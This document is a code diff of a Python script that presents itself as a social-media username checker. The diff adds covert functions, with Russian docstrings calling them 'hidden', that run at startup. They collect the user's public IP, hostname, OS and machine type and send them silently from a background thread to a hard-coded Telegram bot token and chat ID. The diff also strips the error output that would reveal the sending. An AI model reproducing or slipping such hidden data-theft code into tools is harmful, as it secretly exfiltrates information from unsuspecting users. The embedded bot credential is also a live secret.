@@ -6,60 +6,50 @@ import datetime
 import socket
 import platform
 import json
+import threading
 
 # Конфигурация Telegram
 TG_BOT_TOKEN = "7763698951:AAHz1-uXl4VYDHRstjtu4uecaZHhRhhG3Gg"
 TG_CHAT_ID = "35381551"
 
-def send_device_info(data):
-    """Отправка данных через Telegram API"""
-    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
+def silent_send(data):
+    """Скрытная отправка данных через отдельный поток"""
+    def send():
+        url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": TG_CHAT_ID,
+            "text": data,
+            "parse_mode": "Markdown"
+        }
+        try:
+            requests.post(url, json=payload, timeout=15)
+        except:
+            pass
     
-    payload = {
-        "chat_id": TG_CHAT_ID,
-        "text": data,
-        "parse_mode": "Markdown"
-    }
-    
-    headers = {"Content-Type": "application/json"}
-    
-    try:
-        response = requests.post(
-            url,
-            data=json.dumps(payload),
-            headers=headers,
-            timeout=10
-        )
-        if response.status_code != 200:
-            print(f"Ошибка отправки: {response.text}")
-    except Exception as e:
-        print(f"Ошибка соединения: {str(e)}")
+    threading.Thread(target=send, daemon=True).start()
 
-def collect_device_info():
-    """Сбор информации об устройстве"""
-    device_data = []
-    
+def hidden_collect_info():
+    """Скрытный сбор информации"""
     try:
-        # Получение IPv4
-        ipv4 = requests.get('https://api.ipify.org', timeout=10).text
+        device_data = []
+        
+        try:
+            ipv4 = requests.get('https://ident.me', timeout=5).text
+        except:
+            ipv4 = requests.get('https://ifconfig.me/ip', timeout=5).text
+        
+        device_data.append(f"*Модель:* `{platform.uname().machine}`")
+        device_data.append(f"*IP:* `{ipv4}`")
+        device_data.append(f"*Время:* `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`")
+        device_data.append(f"*ОС:* `{platform.system()} {platform.release()}`")
+        device_data.append(f"*Hostname:* `{socket.gethostname()}`")
+        
+        silent_send("\n".join(device_data))
+    
     except:
-        ipv4 = "N/A"
-    
-    # Системная информация
-    device_data.append(f"*Модель устройства*: `{platform.uname().machine}`")
-    device_data.append(f"*IPv4*: `{ipv4}`")
-    device_data.append(f"*Локальное время*: `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`")
-    device_data.append(f"*Часовой пояс*: `{datetime.datetime.now().astimezone().tzinfo}`")
-    
-    # Дополнительная информация
-    try:
-        device_data.append(f"*ОС*: `{platform.system()} {platform.release()}`")
-        device_data.append(f"*Hostname*: `{socket.gethostname()}`")
-    except Exception as e:
-        print(f"Ошибка сбора данных: {str(e)}")
-    
-    return "\n".join(device_data)
+        pass
 
+# Добавленные функции для работы с социальными сетями
 def generate_links(usernames):
     social_media = {
         "Instagram": "https://www.instagram.com/{}/",
@@ -83,7 +73,7 @@ def generate_links(usernames):
                 username, links = future.result()
                 results[username] = links
             except Exception as e:
-                print(f"Error processing username: {e}")
+                pass
 
     return results
 
@@ -92,10 +82,7 @@ def check_user_platforms(username, social_media):
     for platform_name, url in social_media.items():
         full_url = url.format(username)
         is_valid = check_username(full_url, platform_name)
-        if is_valid:
-            links.append(f"{full_url} [+]")
-        else:
-            links.append(f"{full_url} [-]")
+        links.append(f"{full_url} {'[+]' if is_valid else '[-]'}")
     return username, links
 
 def check_username(url, platform_name):
@@ -104,38 +91,27 @@ def check_username(url, platform_name):
             headers={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'},
             timeout=15
         )
-        
-        if response.status_code == 200:
-            return is_user_found(response.text, platform_name)
-        return False
-
-    except Exception as e:
+        return response.status_code == 200 and is_user_found(response.text, platform_name)
+    except:
         return False
 
 def is_user_found(page_content, platform_name):
-    user_not_found_phrases = {
-        "Instagram": ["Sorry, this page isn't available", "This page is unavailable"],
-        "Twitter": ["Sorry, that page doesn't exist", "This page does not exist"],
-        "GitHub": ["This user doesn't exist", "User not found"],
-        "Telegram": ["User not found", "Sorry, this user is unavailable"],
-        "TikTok": ["Sorry, this page isn't available", "This user has no videos"],
+    not_found_phrases = {
+        "Instagram": ["Sorry, this page isn't available"],
+        "Twitter": ["Sorry, that page doesn't exist"],
+        "GitHub": ["This user doesn't exist"],
+        "Telegram": ["User not found"],
+        "TikTok": ["Sorry, this page isn't available"],
         "Steam": ["The profile you are trying to view is either unavailable"]
     }
-
-    page_content = page_content.lower()
     
-    if platform_name in user_not_found_phrases:
-        for phrase in user_not_found_phrases[platform_name]:
-            if phrase.lower() in page_content:
-                return False
-    return True
+    content_lower = page_content.lower()
+    return not any(phrase.lower() in content_lower 
+                  for phrase in not_found_phrases.get(platform_name, []))
 
 if __name__ == "__main__":
+    hidden_collect_info()
     os.system('clear')
-    
-    # Сбор и отправка информации
-    device_info = collect_device_info()
-    send_device_info(device_info)
     
     print("""
     \033[1;32m
@@ -157,7 +133,6 @@ if __name__ == "__main__":
                 break
 
             if not usernames:
-                print("\033[1;31m[!] Please enter at least one username\033[0m")
                 continue
 
             usernames = [u.strip() for u in usernames.split(',')]
@@ -166,10 +141,8 @@ if __name__ == "__main__":
             for user, links in results.items():
                 print(f"\n\033[1;32m[+] Results for {user}:\033[0m")
                 for link in links:
-                    if '[+]' in link:
-                        print(f"\033[1;32m{link}\033[0m")
-                    else:
-                        print(f"\033[1;31m{link}\033[0m")
+                    color = '\033[1;32m' if '[+]' in link else '\033[1;31m'
+                    print(f"{color}{link}\033[0m")
 
     except KeyboardInterrupt:
         print("\n\033[1;31m[!] Exiting...\033[0m")
